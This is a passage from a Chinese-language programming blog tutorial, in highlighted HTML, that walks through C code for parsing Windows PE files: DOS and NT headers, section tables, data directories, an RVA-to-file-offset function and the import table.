data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">//MS-DOS</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token comment">//PE</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//_IMAGE_NT_HEADERS</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	PIMAGE_NT_HEADERS ReadNTHeaders<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	ReadNTHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE标志位：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>Signature<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"运行平台：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>Machine<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImageBase：%x\n"</span><span class="token punctuation">,</span> ReadNTHeaders<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token comment">// 区段解析遍历</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Section Header Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	PIMAGE_SECTION_HEADER ReadSectionHeader <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>ReadNTHeaders<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	PIMAGE_FILE_HEADER pFileHeader <span class="token operator">=</span> <span class="token operator">&amp;</span>ReadNTHeaders<span class="token operator">-></span>FileHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pFileHeader<span class="token operator">-></span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name(区段名称)：%s\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"VOffset(起始的相对虚拟地址)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"VSize(区段大小)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ROffset(文件偏移)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RSize(文件中的区段大小)：%08X\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"标记(区段的属性)：%08X\n\n"</span><span class="token punctuation">,</span> ReadSectionHeader<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226102347066.png" alt="image-20220226102347066" /></p>
<h1 id="数据目录表结构与地址转换函数"><a class="anchor" href="#数据目录表结构与地址转换函数">#</a> 数据目录表结构与地址转换函数</h1>
<h2 id="数据目录"><a class="anchor" href="#数据目录">#</a> 数据目录</h2>
<p>VS 中查看 <code>_IMAGE_DATA_DIRECTORY</code> ，查看数据目录表结构</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   Size<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span>    <span class="token expression"><span class="token number">16</span></span></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226112153373.png" alt="image-20220226112153373" /></p>
<ul>
<li>
<p>VirtualAddress：虚拟地址，而就是数据目录表的起始位置</p>
</li>
<li>
<p>Size：尺寸</p>
</li>
<li>
<p>VirtualAddress + Size：结束地址</p>
</li>
</ul>
<p>数据目录表存在一定的顺序，在 VS 中通过查看 <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> ，查看数据目录表结构顺序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226112813147.png" alt="image-20220226112813147" /></p>
<p>通过 PE ditor 打开查看数据目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226111903077.png" alt="image-20220226111903077" /></p>
<h2 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 计算数据目录表起始位置到文件头的偏移</span></pre></td></tr><tr><td data-num="2"></td><td><pre>DWORD <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>DWORD dwRva<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>DWORD <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>DWORD dwRva<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">//dwRva 是某个数据目录表的 VirtualAddress</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//buffer 是读取到的 PE 文件缓冲区</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">// 区段表</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_SECTION_HEADER pSection <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pNt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token comment">// 判断是否落在了头部当中</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRva <span class="token operator">&lt;</span> pSection<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">return</span> dwRva<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token comment">//VirtualAddress：虚拟地址，而就是数据目录表的起始位置</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token comment">//Size：尺寸</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token comment">//VirtualAddress + Size：结束地址</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token comment">// 判断是否落在某个区段内</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pNt<span class="token operator">-></span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRva <span class="token operator">>=</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">&amp;&amp;</span> dwRva <span class="token operator">&lt;=</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>			<span class="token comment">//dwRva - pSection [i].VirtualAddress 是数据目录表到区段的起始地址的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="29"></td><td><pre>			<span class="token comment">//pSection [i].PointerToRawData 区段到文件头的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="30"></td><td><pre>			<span class="token keyword">return</span> dwRva <span class="token operator">-</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> pSection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>			<span class="token comment">// 返回的是数据目录表到文件头的偏移（OFFSET）</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="导入表结构解析"><a class="anchor" href="#导入表结构解析">#</a> 导入表结构解析</h1>
<p>导入表结构</p>
<ul>
<li><code>_IMAGE_IMPORT_DESCRIPTOR</code></li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD   Characteristics<span class="token punctuation">;</span>            <span class="token comment">// 0 for terminating null import descriptor</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        DWORD   OriginalFirstThunk<span class="token punctuation">;</span>         <span class="token comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span>                  <span class="token comment">// 0 if not bound,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                                            <span class="token comment">// -1 if bound, and real date\time stamp</span></pre></td></tr><tr><td data-num="8"></td><td><pre>                                            <span class="token comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>                                            <span class="token comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD   ForwarderChain<span class="token punctuation">;</span>                 <span class="token comment">// -1 if no forwarders</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD   Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DWORD   FirstThunk<span class="token punctuation">;</span>                     <span class="token comment">// RVA to IAT (if bound this IAT has actual addresses)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span class="token operator">*</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226115958511.png" alt="image-20220226115958511" /></p>
<ul>
<li>_IMAGE_THUNK_DATA32</li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_THUNK_DATA32</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD ForwarderString<span class="token punctuation">;</span>      <span class="token comment">// PBYTE </span></pre></td></tr><tr><td data-num="4"></td><td><pre>        DWORD Function<span class="token punctuation">;</span>             <span class="token comment">// PDWORD</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        DWORD Ordinal<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        DWORD AddressOfData<span class="token punctuation">;</span>        <span class="token comment">// PIMAGE_IMPORT_BY_NAME</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span> u1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_THUNK_DATA32<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">typedef</span> IMAGE_THUNK_DATA32 <span class="token operator">*</span> PIMAGE_THUNK_DATA32<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226120128235.png" alt="image-20220226120128235" /></p>
<ul>
<li>_IMAGE_IMPORT_BY_NAME</li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_BY_NAME</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    WORD    Hint<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    CHAR   Name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_IMPORT_BY_NAME<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226120404893.png" alt="image-20220226120404893" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码</h2>
<p>PE 编辑器查看导入表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226123610696.png" alt="image-20220226123610696" /></p>
<h3 id="导入表解析函数代码"><a class="anchor" href="#导入表解析函数代码">#</a> 导入表解析函数代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">// 定位导入表</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_DATA_DIRECTORY pImportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">// 填充结构</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_IMPORT_DESCRIPTOR pImport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLL名称：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"日期时间标志：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ForwarderChain：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>ForwarderChain<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FirstThunk：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>FirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OriginalFirstThunk：%08X\n\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		pImport <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226123434816.png" alt="image-20220226123434816" /></p>
<h3 id="导入表动态信息库api解析代码"><a class="anchor" href="#导入表动态信息库api解析代码">#</a> 导入表动态信息库 (API) 解析代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td 